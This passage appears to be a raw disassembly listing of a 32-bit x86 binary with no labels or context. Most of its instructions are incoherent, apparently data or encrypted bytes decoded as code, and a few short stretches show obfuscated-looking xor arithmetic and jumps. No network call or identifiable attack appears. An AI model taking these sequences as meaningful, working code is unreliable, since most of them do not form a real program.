  409d12:	mov    ebp,0xd4935a04
  409d17:	cmp    BYTE PTR [esi-0x317e9a8b],bl
  409d1d:	cli    
  409d1e:	js     0x409cb7
  409d20:	inc    edx
  409d21:	mov    DWORD PTR [esi-0x24ec15c4],edx
  409d27:	adc    al,0x38
  409d29:	pusha  
  409d2a:	sbb    DWORD PTR [ecx-0x17],edx
  409d2d:	dec    ebx
  409d2e:	mov    es,WORD PTR [ebp-0x1ac9b442]
  409d34:	push   0x18850442
  409d39:	sub    BYTE PTR [eax-0x5e],dl
  409d3c:	xchg   edx,eax
  409d3d:	sub    ah,BYTE PTR [edi+edi*8-0x5]
  409d41:	loopne 0x409cf2
  409d43:	xor    al,0x4e
  409d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d46:	dec    esp
  409d47:	mov    DWORD PTR [ecx],esp
  409d49:	pop    ds
  409d4a:	popa   
  409d4b:	pop    ss
  409d4c:	mov    edx,0xcb07b713
  409d51:	add    cl,BYTE PTR [esi-0x789e8ec2]
  409d57:	aas    
  409d58:	fwait
  409d59:	ins    BYTE PTR es:[edi],dx
  409d5a:	int    0x5e
  409d5c:	xor    DWORD PTR [esp+ebp*2-0x6cb283a3],edx
  409d63:	call   0x62da11da
  409d68:	test   eax,0x17b5b41c
  409d6d:	jl     0x409d22
  409d6f:	add    DWORD PTR [ecx],ebx
  409d71:	add    al,0xe2
  409d73:	dec    edx
  409d74:	mov    ?,WORD PTR [eax]
  409d76:	into   
  409d77:	in     al,dx
  409d78:	jnp    0x409d38
  409d7a:	ins    BYTE PTR es:[edi],dx
  409d7b:	popa   
  409d7c:	push   edi
  409d7d:	mov    WORD PTR [esi],?
  409d7f:	mov    bl,0x7f
  409d81:	mov    edx,0xa13a6ba
  409d86:	lock in al,dx
  409d88:	jmp    0x409d69
  409d8a:	sahf   
  409d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d8c:	jge    0x409d25
  409d8e:	mov    ecx,0x9a368e51
  409d93:	pop    esp
  409d94:	pusha  
  409d95:	loope  0x409e06
  409d97:	lea    esp,gs:[bx+0xadd]
  409d9d:	adc    DWORD PTR [esi+0x17],esp
  409da0:	int3   
  409da1:	push   ebx
  409da2:	mov    ebp,0xfbc793b
  409da7:	cmp    BYTE PTR [ecx-0x49],bl
  409daa:	in     eax,dx
  409dab:	xchg   BYTE PTR [ebp+ecx*8+0x4b35315e],ch
  409db2:	data16 loop 0x409e2b
  409db5:	adc    al,0x2d
  409db7:	pop    eax
  409db8:	lock std 
  409dba:	pop    ebx
  409dbb:	lahf   
  409dbc:	add    DWORD PTR [edx],edx
  409dbe:	fild   DWORD PTR [eax-0x3b]
  409dc1:	and    DWORD PTR [eax+0x1d],eax
  409dc4:	ins    DWORD PTR es:[edi],dx
  409dc5:	inc    ecx
  409dc6:	jnp    0x409db6
  409dc8:	and    DWORD PTR [ebx],0x506ce795
  409dce:	daa    
  409dcf:	or     cl,BYTE PTR [edi+0x79332db5]
  409dd5:	fimul  WORD PTR [esi]
  409dd7:	inc    ebx
  409dd8:	sbb    BYTE PTR [ebx+0x21],0xe5
  409ddc:	pop    esp
  409ddd:	push   ebx
  409dde:	pop    eax
  409ddf:	dec    esp
  409de0:	pop    ds
  409de1:	mov    ch,0xe1
  409de3:	ret    0xe70f
  409de6:	fld    DWORD PTR [esi+eiz*4-0x166c0da2]
  409ded:	dec    ecx
  409dee:	add    ch,bl
  409df0:	sub    ebx,DWORD PTR [ecx+0x3c110cac]
  409df6:	jmp    0x8550:0xd27e27e1
  409dfd:	aaa    
  409dfe:	rcr    dh,cl
  409e00:	adc    eax,0x3f1aa0a8
  409e05:	aad    0x17
  409e07:	xor    edi,DWORD PTR [ebx-0x1c]
  409e0a:	test   BYTE PTR [esi],bl
  409e0c:	mov    bh,0x47
  409e0e:	mov    BYTE PTR [esi],0xdb
  409e11:	pand   mm6,QWORD PTR [esi+0x6]
  409e15:	adc    al,0x50
  409e17:	adc    eax,0x905fd6f3
  409e1c:	inc    ebx
  409e1d:	pop    eax
  409e1e:	or     al,0x2c
  409e20:	adc    BYTE PTR [eax],0xcb
  409e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e24:	or     esi,esi
  409e26:	and    edi,DWORD PTR ds:0x75aca60f
  409e2c:	mov    dl,0xc5
  409e2e:	sbb    bh,BYTE PTR [ebp+0x56]
  409e31:	xchg   ebp,eax
  409e32:	push   esi
  409e33:	cmp    eax,0x609d6b4b
  409e38:	sub    ecx,ebp
  409e3a:	jmp    DWORD PTR [ebx+0x757a976e]
  409e40:	outs   dx,BYTE PTR ds:[esi]
  409e41:	push   0x26
  409e43:	push   edx
  409e44:	xor    al,0x1e
  409e46:	jno    0x409e6f
  409e48:	cmp    eax,0x56cb861c
  409e4d:	xchg   esi,eax
  409e4e:	mov    dl,0xce
  409e50:	xchg   ecx,eax
  409e51:	fild   QWORD PTR [esi+0x7d]
  409e54:	add    BYTE PTR [ecx],bl
  409e56:	inc    BYTE PTR [edi-0x25]
  409e59:	or     cl,BYTE PTR [ecx]
  409e5b:	lds    ebp,FWORD PTR ds:0x962bd856
  409e61:	push   es
  409e62:	pop    edi
  409e63:	xchg   BYTE PTR [edx-0x69],ch
  409e66:	and    BYTE PTR [edx-0x3b],ch
  409e69:	xor    BYTE PTR [ecx+0x6e],bh
  409e6c:	and    al,0xe
  409e6e:	mov    ecx,DWORD PTR [esp+eax*4+0x5ad69aa1]
  409e75:	adc    al,0xb7
  409e77:	lods   al,BYTE PTR ds:[esi]
  409e78:	xchg   ebx,eax
  409e79:	test   eax,0xf2b4e6ba
  409e7e:	hlt    
  409e7f:	cmp    BYTE PTR [edi],ah
  409e81:	loopne 0x409eeb
  409e83:	cli    
  409e84:	test   eax,0x68b572ea
  409e89:	in     eax,dx
  409e8a:	pop    es
  409e8b:	or     al,BYTE PTR [ecx]
  409e8d:	das    
  409e8e:	or     eax,eax
  409e90:	outs   dx,BYTE PTR ds:[esi]
  409e91:	and    ebp,DWORD PTR [ebp+0x73]
  409e94:	ja     0x409e78
  409e96:	ins    BYTE PTR es:[edi],dx
  409e97:	shr    DWORD PTR [esi+0x14],0x82
  409e9b:	dec    eax
  409e9c:	xlat   BYTE PTR ds:[ebx]
  409e9d:	xchg   ecx,eax
  409e9e:	sti    
  409e9f:	icebp  
  409ea0:	bound  edx,QWORD PTR [eax-0x1f6575ec]
  409ea6:	pop    DWORD PTR [esp+ebp*2]
  409ea9:	jecxz  0x409e5c
  409eab:	cs jecxz 0x409e93
  409eae:	dec    edx
  409eaf:	or     ax,0x7143
  409eb3:	jge    0x409f04
  409eb5:	add    eax,0xf18c8189
  409eba:	push   0x6803143e
  409ebf:	ja     0x409f31
  409ec1:	mov    cl,0xb4
  409ec3:	adc    edx,ebp
  409ec5:	fidiv  WORD PTR [ebp+0xd]
  409ec8:	jmp    0x2bd9:0xfeb71100
  409ecf:	jb     0x409eb0
  409ed1:	mov    ds:0xe1249593,al
  409ed6:	push   ecx
  409ed7:	(bad)  
  409ed8:	push   ecx
  409ed9:	push   0xc7603aa1
  409ede:	daa    
  409edf:	push   esp
  409ee0:	cli    
  409ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee2:	cmp    ebp,eax
  409ee4:	loopne 0x409edf
  409ee6:	sbb    BYTE PTR [ebp+0x26126f1b],ch
  409eec:	popa   
  409eed:	add    BYTE PTR [esi-0x11cc77e9],bl
  409ef3:	loope  0x409e7a
  409ef5:	aad    0xb0
  409ef7:	mov    esp,0x4b763719
  409efc:	pushf  
  409efd:	mov    ds:0x6c9e5607,al
  409f02:	mov    al,0x37
  409f04:	int3   
  409f05:	dec    ebp
  409f06:	daa    
  409f07:	mov    WORD PTR [edx-0x84d20b9],ss
  409f0d:	pop    ebx
  409f0e:	(bad)  
  409f10:	loopne 0x409f5e
  409f12:	adc    ebx,edx
  409f14:	or     DWORD PTR [edi+0x76e8f3be],esp
  409f1a:	xchg   ecx,eax
  409f1b:	popf   
  409f1c:	pushf  
  409f1d:	push   ebp
  409f1e:	mov    DWORD PTR [eax],esp
  409f20:	test   eax,0x81968456
  409f25:	or     DWORD PTR es:[ecx-0x7d7c4fab],edx
  409f2c:	or     ah,BYTE PTR [ecx-0x4e455f52]
  409f32:	cmp    al,0xd7
  409f34:	inc    eax
  409f35:	sahf   
  409f36:	adc    DWORD PTR [ecx-0x43],edx
  409f39:	inc    edi
  409f3a:	jmp    0x88d1122a
  409f3f:	dec    edi
  409f40:	addr16 jbe 0x409f02
  409f43:	jno    0x409f1f
  409f45:	mov    bl,0x49
  409f47:	pop    es
  409f48:	daa    
  409f49:	int3   
  409f4a:	enter  0x61e5,0xdd
  409f4e:	popa   
  409f4f:	add    al,0x4b
  409f51:	pop    ecx
  409f52:	test   bh,0xb3
  409f55:	in     eax,dx
  409f56:	pop    esp
  409f57:	ror    bh,cl
  409f59:	mov    bl,0xe1
  409f5b:	int    0x79
  409f5d:	xchg   ebp,eax
  409f5e:	out    0x96,eax
  409f60:	jb     0x409f68
  409f62:	jmp    0xdf32:0x9630faab
  409f69:	xchg   esi,eax
  409f6a:	ret    0x2a8b
  409f6d:	add    eax,0xdd2afc1b
  409f72:	adc    bl,BYTE PTR [eax+0x2b]
  409f75:	sbb    edi,DWORD PTR fs:[ebx]
  409f78:	rcr    BYTE PTR [edx],cl
  409f7a:	jmp    0xdfc3:0x2bfb5570
  409f81:	cdq    
  409f82:	and    al,0x60
  409f84:	jmp    0xf8cf6a01
  409f89:	fidiv  WORD PTR [eax+0x72]
  409f8c:	push   esp
  409f8d:	sub    ecx,DWORD PTR [ebx+0x2ecde152]
  409f93:	push   ss
  409f94:	xchg   BYTE PTR [ebx+0x6],ch
  409f97:	stos   DWORD PTR es:[edi],eax
  409f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f99:	repnz sub bl,bh
  409f9c:	jo     0x409f2e
  409f9e:	(bad)  
  409f9f:	adc    al,0x75
  409fa1:	mov    DWORD PTR [edi+0x42a5028a],ebp
  409fa7:	call   ebx
  409fa9:	or     eax,0x815bb95e
  409fae:	jbe    0x409f57
  409fb0:	mov    WORD PTR [eax+0x12ceb747],es
  409fb6:	ret    0xbd2c
  409fb9:	setl   dh
  409fbc:	xchg   edx,edx
  409fbe:	stos   BYTE PTR es:[edi],al
  409fbf:	push   cs
  409fc0:	sub    edi,DWORD PTR [eax-0x1]
  409fc3:	lahf   
  409fc4:	and    eax,0x65f71c79
  409fc9:	sbb    eax,0x27b567e2
  409fce:	pop    eax
  409fcf:	sub    esi,DWORD PTR [edi-0x32]
  409fd2:	imul   edx,eax,0xffffff97
  409fd5:	clc    
  409fd6:	pop    es
  409fd7:	mov    ds:0xc5686e2d,al
  409fdc:	and    bl,BYTE PTR ds:0xa58bbe7d
  409fe2:	sbb    ah,BYTE PTR [edx-0x74a79a54]
  409fe8:	pop    eax
  409fe9:	jnp    0x409f90
  409feb:	je     0x409f75
  409fed:	fild   DWORD PTR [eax+0x62]
  409ff0:	jmp    0x2d1e:0xac9fd3a9
  409ff7:	stc    
  409ff8:	std    
  409ff9:	out    dx,eax
  409ffa:	mov    eax,ds:0xaa4a1014
  409fff:	arpl   sp,di
  40a001:	fist   DWORD PTR ds:0x39cb33db
  40a007:	push   ss
  40a008:	mov    bl,0x8b
  40a00a:	dec    ebp
  40a00b:	lock xor eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x52]
  40a02a:	xlat   BYTE PTR ds:[ebx]
  40a02b:	iret   
  40a02c:	dec    ebx
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	jl     0x40a0b5
  40a037:	jmp    0x327796f9
  40a03c:	jo     0x409fd1
  40a03e:	sub    DWORD PTR [edi-0x56856ef],ebx
  40a044:	xor    bh,BYTE PTR [esi-0x12]
  40a047:	mov    ebx,0x8fda027c
  40a04c:	or     al,0x46
  40a04e:	sbb    DWORD PTR [ebp+0x33],ebx
  40a051:	sar    BYTE PTR [eax+0x3d],cl
  40a054:	popa   
  40a055:	(bad)  
  40a056:	dec    edx
  40a057:	imul   ecx,esp,0x20
  40a05a:	push   ebx
  40a05b:	or     al,0xa0
  40a05d:	(bad)  
  40a05e:	lahf   
  40a05f:	dec    esp
  40a060:	in     eax,0x3
  40a062:	and    edx,DWORD PTR [edx-0x59e85e94]
  40a068:	jge    0x40a0ab
  40a06a:	les    esp,FWORD PTR [ebp-0x2cb528c5]
  40a070:	jle    0x40a07c
  40a072:	inc    eax
  40a073:	lahf   
  40a074:	mov    eax,0x380f018e
  40a079:	jmp    0x695a:0xdca2f4b5
  40a080:	mov    dl,0x71
  40a082:	jb     0x40a018
  40a084:	cmp    BYTE PTR [ecx-0x3c2310c8],bh
  40a08a:	inc    esp
  40a08b:	fs pop ss
  40a08d:	and    ecx,DWORD PTR [ecx]
  40a08f:	or     eax,0xa84d8d41
  40a094:	push   ss
  40a095:	jne    0x40a044
  40a097:	push   0x67
  40a099:	in     al,dx
  40a09a:	cmp    eax,0xfb906b37
  40a09f:	and    ch,BYTE PTR [edi-0x61]
  40a0a2:	fild   DWORD PTR cs:[edx-0x301a9e66]
  40a0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0aa:	daa    
  40a0ab:	ret    
  40a0ac:	add    eax,0x90129ba6
  40a0b1:	fsubr  DWORD PTR [esi]
  40a0b3:	aaa    
  40a0b4:	mov    ch,0x80
  40a0b6:	(bad)  
  40a0b7:	cli    
  40a0b8:	dec    ecx
  40a0b9:	xor    DWORD PTR [ebp+0x3a],esp
  40a0bc:	pop    ebx
  40a0bd:	add    BYTE PTR [ebp-0x3b2facc1],bl
  40a0c3:	arpl   sp,cx
  40a0c5:	fnstcw WORD PTR [edi]
  40a0c7:	scas   eax,DWORD PTR es:[edi]
  40a0c8:	sbb    eax,0xa6aa31ef
  40a0cd:	ins    DWORD PTR es:[edi],dx
  40a0ce:	cmp    eax,0x88f4315f
  40a0d3:	pop    eax
  40a0d4:	push   cs
  40a0d5:	test   al,0xf4
  40a0d7:	push   ss
  40a0d8:	dec    edi
  40a0d9:	fild   QWORD PTR [edi-0x6ab4f66]
  40a0df:	sub    edx,DWORD PTR [ebx-0x37]
  40a0e2:	das    
  40a0e3:	imul   edx,DWORD PTR [ebx-0x2b],0x1f
  40a0e7:	test   BYTE PTR [edx+ebp*4+0x79ce6aa7],bh
  40a0ee:	repnz sbb al,0x9c
  40a0f1:	fisttp QWORD PTR [ebp+0x59b082fc]
  40a0f7:	jnp    0x40a09b
  40a0f9:	std    
  40a0fa:	jle    0x40a16a
  40a0fc:	js     0x40a0d1
  40a0fe:	mov    bh,ch
  40a100:	dec    esi
  40a101:	jl     0x40a125
  40a103:	lahf   
  40a104:	adc    BYTE PTR [edi-0x14],ah
  40a107:	mov    ah,0x9e
  40a109:	push   0x2c
  40a10b:	mov    ds:0xd1fd571b,al
  40a110:	stc    
  40a111:	ja     0x40a098
  40a113:	(bad)  
  40a114:	jp     0x40a149
  40a116:	test   eax,0xf2038f7c
  40a11b:	mov    edi,0x4bbac427
  40a120:	xor    edx,ecx
  40a122:	imul   edx,DWORD PTR [ebx],0x383cd811
  40a128:	xchg   ebx,eax
  40a129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a12a:	inc    eax
  40a12b:	and    dl,BYTE PTR [edx+edx*4-0x49]
  40a12f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a130:	ins    BYTE PTR es:[edi],dx
  40a131:	pusha  
  40a132:	jo     0x40a135
  40a134:	in     al,dx
  40a135:	or     al,BYTE PTR [edx]
  40a137:	mov    ebp,edi
  40a139:	pushf  
  40a13a:	fst    QWORD PTR [ecx]
  40a13c:	mov    ds:0xea93c468,eax
  40a141:	adc    BYTE PTR [eax],al
  40a143:	outs   dx,BYTE PTR ds:[esi]
  40a144:	or     DWORD PTR [edx-0x60],edx
  40a147:	sbb    BYTE PTR [edx-0x7d],cl
  40a14a:	nop
  40a14b:	stc    
  40a14c:	mov    ecx,0x896dfb3d
  40a151:	cmp    eax,DWORD PTR ds:0xbd505c
  40a157:	aam    0x7c
  40a159:	call   0xa4a5b83a
  40a15e:	jae    0x40a0fb
  40a160:	sbb    DWORD PTR [ecx+0x28],ebp
  40a163:	push   esp
  40a164:	sahf   
  40a165:	pop    eax
  40a166:	leave  
  40a167:	test   BYTE PTR [edi],0x1d
  40a16a:	pop    ecx
  40a16b:	lds    ebx,FWORD PTR [edi]
  40a16d:	mov    bl,0x10
  40a16f:	sub    eax,0x718a9b64
  40a174:	and    esp,edx
  40a176:	push   0x91f9d5ea
  40a17b:	retf   0x63e9
  40a17e:	adc    esi,DWORD PTR [ecx+0x10]
  40a181:	fwait
  40a182:	mov    ecx,DWORD PTR [ebx+0x30]
  40a185:	inc    ebp
  40a186:	mov    BYTE PTR [edi+0x7f],bl
  40a189:	sbb    eax,0x7d60d72b
  40a18e:	inc    edx
  40a18f:	push   edx
  40a190:	hlt    
  40a191:	(bad)  
  40a193:	frstor [edi+0x6f]
  40a196:	xor    DWORD PTR [ebp+0x46],ecx
  40a199:	(bad)  
  40a19b:	xchg   esi,eax
  40a19c:	mov    ebp,0xbeec6fe7
  40a1a1:	fucomip st,st(2)
  40a1a3:	push   ss
  40a1a4:	xchg   BYTE PTR [ebp-0x23863f0d],ch
  40a1aa:	or     al,0x1c
  40a1ac:	retf   
  40a1ad:	add    DWORD PTR [edx+esi*2+0x1],ecx
  40a1b1:	(bad)  
  40a1b2:	push   ss
  40a1b3:	stos   DWORD PTR es:[edi],eax
  40a1b4:	loop   0x40a17a
  40a1b6:	push   esp
  40a1b7:	sbb    edi,DWORD PTR [ebp-0x6749453c]
  40a1bd:	in     eax,0x41
  40a1bf:	pop    esp
  40a1c0:	xor    DWORD PTR [ecx+edi*4-0x49],0x50
  40a1c5:	in     al,0x2c
  40a1c7:	push   eax
  40a1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1c9:	mov    BYTE PTR [eax-0x33],bh
  40a1cc:	nop
  40a1cd:	push   ss
  40a1ce:	mov    ebp,0x3c867e8c
  40a1d3:	aas    
  40a1d4:	jne    0x40a1ce
  40a1d6:	mov    eax,0x903d81f5
  40a1db:	fnsave [edi]
  40a1dd:	fs mov ch,0x13
  40a1e0:	jb     0x40a191
  40a1e2:	ja     0x40a1dd
  40a1e4:	dec    edx
  40a1e5:	sub    ah,BYTE PTR [esi]
  40a1e7:	fsubr  QWORD PTR [edi-0x7b5a9c57]
  40a1ed:	and    eax,0x931fe6e0
  40a1f2:	hlt    
  40a1f3:	mov    esi,0x924251c3
  40a1f8:	add    DWORD PTR [edx-0x38],esi
  40a1fb:	les    ecx,FWORD PTR [esi]
  40a1fd:	repz ds xchg ebp,eax
  40a200:	bound  ecx,QWORD PTR [ecx]
  40a202:	jnp    0x40a1c7
  40a204:	pusha  
  40a205:	loopne 0x40a1b7
  40a207:	test   DWORD PTR [esi-0x49],0x53777663
  40a20e:	dec    ebp
  40a20f:	xor    dh,dh
  40a211:	mov    WORD PTR [esi-0x71fc1861],es
  40a217:	mov    ecx,0x2441641b
  40a21c:	outs   dx,DWORD PTR ds:[esi]
  40a21d:	cs std 
  40a21f:	aam    0xad
  40a221:	push   cs
  40a222:	adc    BYTE PTR [esi+0x2f3a4f7c],bl
  40a228:	xchg   esi,eax
  40a229:	fsub   DWORD PTR [ebx+0x371f5072]
  40a22f:	dec    esi
  40a230:	inc    ecx
  40a231:	jns    0x40a297
  40a233:	cld    
  40a234:	mov    bh,0x90
  40a236:	adc    edx,esp
  40a238:	cmp    BYTE PTR [eax-0x14],0xb8
  40a23c:	jno    0x40a28b
  40a23e:	cdq    
  40a23f:	(bad)  
  40a240:	gs aad 0x43
  40a243:	(bad)  
  40a244:	cmc    
  40a245:	fdiv   QWORD PTR [ebp+0x63]
  40a248:	jle    0x40a2ab
  40a24a:	pop    ebx
  40a24b:	inc    edi
  40a24c:	sub    eax,0x6407bf30
  40a251:	cmp    eax,0x2331f1fe
  40a256:	dec    ebx
  40a257:	hlt    
  40a258:	xchg   esi,eax
  40a259:	push   ds
  40a25a:	xchg   ebx,eax
  40a25b:	dec    esp
  40a25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a25d:	mov    ecx,0x9c44e975
  40a262:	jb     0x40a23c
  40a264:	ja     0x40a1f5
  40a266:	iret   
  40a267:	outs   dx,DWORD PTR ds:[esi]
  40a268:	xor    ebp,0xffffff80
  40a26b:	fdivr  QWORD PTR [edi]
  40a26d:	pop    edi
  40a26e:	jp     0x40a2ea
  40a270:	adc    dh,BYTE PTR [esi]
  40a272:	(bad)  
  40a273:	mov    esp,0x578b14c7
  40a278:	pop    esp
  40a279:	jge    0x40a21d
  40a27b:	inc    esp
  40a27c:	add    bl,BYTE PTR [edi-0x354c3f3f]
  40a282:	(bad)  
  40a283:	xor    BYTE PTR [eax],cl
  40a285:	adc    edi,DWORD PTR [ebp+0x33]
  40a288:	iret   
  40a289:	(bad)  
  40a28a:	idiv   DWORD PTR [ebx]
  40a28c:	cmp    edi,DWORD PTR [edx]
  40a28e:	in     eax,0x44
  40a290:	std    
  40a291:	cmp    eax,DWORD PTR [edx-0x7cd19604]
  40a297:	mov    eax,ds:0x8df509a7
  40a29c:	jns    0x40a269
  40a29e:	lods   al,BYTE PTR ds:[esi]
  40a29f:	jno    0x40a2fc
  40a2a1:	cmc    
  40a2a2:	fwait
  40a2a3:	scas   eax,DWORD PTR es:[edi]
  40a2a4:	sahf   
  40a2a5:	iret   
  40a2a6:	push   ss
  40a2a7:	inc    ebp
  40a2a8:	aas    
  40a2a9:	add    eax,0x70dedb8f
  40a2ae:	jmp    0x8f871f07
  40a2b3:	test   ah,bh
  40a2b5:	pushf  
  40a2b6:	test   al,0x5f
  40a2b8:	mov    ebp,0x9863357
  40a2bd:	and    ch,BYTE PTR [ecx+0x161d5d02]
  40a2c3:	pop    esp
  40a2c4:	daa    
  40a2c5:	push   ebx
  40a2c6:	push   ecx
  40a2c7:	je     0x40a2f7
  40a2c9:	xchg   esi,eax
  40a2ca:	xor    DWORD PTR [edi],ebp
  40a2cc:	inc    ebx
  40a2cd:	sub    BYTE PTR [esp+ecx*1],0x3f
  40a2d1:	pop    ss
  40a2d2:	mov    WORD PTR [edx],cs
  40a2d4:	inc    eax
  40a2d5:	or     dh,BYTE PTR [ecx-0x785454d0]
  40a2db:	and    esp,esi
  40a2dd:	mov    al,0xdc
  40a2df:	sar    ebx,cl
  40a2e1:	push   edx
  40a2e2:	(bad)  
  40a2e3:	ins    BYTE PTR es:[edi],dx
  40a2e4:	xor    eax,0x5c1481c8
  40a2e9:	push   cs
  40a2ea:	cdq    
  40a2eb:	adc    eax,0x50240673
  40a2f0:	mov    edi,0x1662540
  40a2f5:	in     eax,dx
  40a2f6:	mov    esp,0xe1e2448c
  40a2fb:	retf   
  40a2fc:	fsub   QWORD PTR es:[ebx+eiz*8+0x17]
  40a301:	loop   0x40a345
  40a303:	or     al,0x4
  40a305:	push   esp
  40a306:	pushf  
  40a307:	inc    edx
  40a308:	into   
  40a309:	fdivr  QWORD PTR [ecx]
  40a30b:	out    dx,eax
  40a30c:	pop    esp
  40a30d:	adc    eax,0xc0987506
  40a312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a313:	jg     0x40a29e
  40a315:	iret   
  40a316:	jo     0x40a2f7
  40a318:	ins    DWORD PTR es:[edi],dx
  40a319:	sub    eax,0xefa12a69
  40a31e:	cmp    esi,DWORD PTR [edx]
  40a320:	loopne 0x40a34f
  40a322:	cmp    DWORD PTR [esi],ebp
  40a324:	pop    es
  40a325:	pop    ebx
  40a326:	pop    esp
  40a327:	jecxz  0x40a336
  40a329:	inc    ebx
  40a32a:	lock ds daa 
  40a32d:	int    0x82
  40a32f:	xchg   esi,eax
  40a330:	fdiv   QWORD PTR [edi]
  40a332:	clc    
  40a333:	fiadd  DWORD PTR [edi]
  40a335:	(bad)  
  40a337:	xor    esi,DWORD PTR [edi+0x65bace33]
  40a33d:	(bad)  
  40a33e:	int    0xff
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	popa   
  40a3cc:	cmp    al,0x91
  40a3ce:	fistp  QWORD PTR [edx+ebp*8+0x7e]
  40a3d2:	jle    0x40a44e
  40a3d4:	jge    0x40a454
  40a3d6:	jle    0x40a442
  40a3d8:	repnz pushf 
  40a3da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3db:	push   ebp
  40a3dc:	leave  
  40a3dd:	(bad)  
  40a3de:	push   es
  40a3df:	pop    esp
  40a3e0:	jb     0x40a3b1
  40a3e2:	inc    ecx
  40a3e3:	jne    0x40a3c1
  40a3e5:	(bad)  
  40a3e6:	stos   DWORD PTR es:[edi],eax
  40a3e7:	sub    dl,dl
  40a3e9:	(bad)  
  40a3ea:	imul   edi,ebx,0x84207b9b
  40a3f0:	jb     0x40a417
  40a3f2:	pop    es
  40a3f3:	inc    ebx
  40a3f4:	mov    dl,0x99
  40a3f6:	dec    ecx
  40a3f7:	gs inc esp
  40a3f9:	push   es
  40a3fa:	ja     0x40a41d
  40a3fc:	xchg   esi,eax
  40a3fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3fe:	test   al,0xcb
  40a400:	sub    al,0xa8
  40a402:	dec    edi
  40a403:	repnz popa 
  40a405:	aas    
  40a406:	adc    DWORD PTR [eax+ecx*2-0x49],eax
  40a40a:	pushf  
  40a40b:	arpl   WORD PTR [ebp-0x7a01d685],bp
  40a411:	mov    ds:0x6e04cedc,eax
  40a416:	mov    cl,0xb7
  40a418:	popa   
  40a419:	push   esi
  40a41a:	xor    esi,ebp
  40a41c:	mov    cl,0x3b
  40a41e:	xchg   ebx,eax
  40a41f:	std    
  40a420:	or     ah,ch
  40a422:	cld    
  40a423:	out    dx,al
  40a424:	das    
  40a425:	xor    al,dl
  40a427:	data16 data16 sub al,0x7d
  40a42b:	fdivr  DWORD PTR [eax+0x19]
  40a42e:	dec    edx
  40a42f:	sbb    esi,edx
  40a431:	push   es
  40a432:	push   ebx
  40a433:	aam    0xe0
  40a435:	shl    DWORD PTR [edi-0x4103ec5],0xf
  40a43c:	test   eax,0x2501d40c
  40a441:	mov    eax,0x6ded21f2
  40a446:	xchg   DWORD PTR [ebx+0x38],edi
  40a449:	ror    BYTE PTR [ecx+esi*2],1
  40a44c:	jmp    0x73f0566
  40a451:	mov    edi,0x7f6c532d
  40a456:	pop    es
  40a457:	retf   0x449
  40a45a:	lds    ecx,FWORD PTR [esi-0x6468fe29]
  40a460:	pop    ss
  40a461:	in     eax,0x90
  40a463:	inc    ecx
  40a464:	and    eax,0x28851410
  40a469:	sbb    BYTE PTR [esi+0xc],cl
  40a46c:	pop    edi
  40a46d:	jbe    0x40a4df
  40a46f:	pop    ebx
  40a470:	sbb    BYTE PTR [esp+ebx*8],ah
  40a473:	cli    
  40a474:	shl    BYTE PTR [esi-0x71773df8],1
  40a47a:	inc    edi
  40a47b:	xor    eax,edx
  40a47d:	sbb    al,0x9e
  40a47f:	arpl   WORD PTR [eax],si
  40a481:	dec    esi
  40a482:	fld    DWORD PTR [edx]
  40a484:	cmp    bh,BYTE PTR [ecx+0x5baca824]
  40a48a:	xchg   ecx,eax
  40a48b:	mov    edi,ecx
  40a48d:	dec    bl
